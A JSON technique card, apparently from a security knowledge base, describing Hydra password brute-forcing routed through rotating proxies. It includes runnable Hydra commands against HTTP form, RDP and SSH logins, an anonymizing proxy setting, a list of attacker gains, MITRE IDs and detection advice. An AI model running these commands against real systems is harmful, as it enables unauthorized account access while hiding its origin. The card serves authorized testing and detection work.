{
  "title": "Hydra Proxy-Routed Credential Attack Workflow",
  "version": "3.0",
  "description": "Hydra authentication testing routed through external proxy infrastructure for segmented access, egress control, and route rotation.",
  "shortDescription": "Hydra Proxy Workflow",
  "tags": [
    "password-cracking",
    "hydra",
    "proxy-routing",
    "online-auth",
    "credential-access"
  ],
  "metadata": {
    "descriptionHtml": "<p>This graph models Hydra credential testing when transport is forced through proxy infrastructure. It captures variable-based proxy selection (<code>HYDRA_PROXY_HTTP</code>, <code>HYDRA_PROXY</code>), optional proxy-pool rotation, and validation of successful credential outcomes.</p>",
    "commandsBlock": "# Step 1: Define proxy route\n$ HYDRA_PROXY=connect://proxy.anonymizer.com:8000\n\n# Step 2: Optionally load proxy pool\n$ HYDRA_PROXY_HTTP='proxylist.txt' hydra -L users.txt -P pass.txt http-post-form://target\n\n# Step 3: Execute routed auth attempts\n$ HYDRA_PROXY=socks4://auth:pw@127.0.0.1:1080 hydra -L users.txt -P pass.txt rdp://target\n\n# Step 4: Validate outcomes\n$ hydra -L users.txt -P pass.txt ssh://target",
    "extraInfo": [
      "Hydra README/man proxy variable behavior",
      "Proxy schemes: HTTP, CONNECT, SOCKS4"
    ],
    "prerequisites": [
      "Reachable proxy infrastructure",
      "Authorized credential testing scope for target services",
      "Prepared user/password candidate sources"
    ],
    "attackerGains": [
      "Operational access to segmented target services",
      "Valid credentials from routed online authentication testing"
    ],
    "detectionNotes": [
      "Monitor auth failures from unusual proxy-origin egress paths",
      "Enforce MFA and lockout protections on target protocols",
      "Detect repeated distributed login attempts via rotating proxies"
    ],
    "mitreCategories": [
      "T1090.002",
      "T1110.001",
      "T1078"
    ]
  },
